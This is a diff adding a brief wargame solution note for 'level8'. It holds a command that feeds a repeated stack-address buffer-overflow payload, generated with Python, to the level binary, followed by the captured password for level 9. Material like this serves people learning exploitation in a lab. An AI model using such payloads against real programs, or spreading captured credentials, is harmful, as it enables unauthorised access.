@@ -1,0 +1,5 @@
+offset must be correct. hence the extra \xb1!
+
+/levels/level8 $(python2.4 -c 'print "\xb1\xdb\xff\xbf"*32') $(python2.4 -c 'print "\xb1\xdb\xff\xbf\xb1"*2')
+password for level 9:apt2tute
+
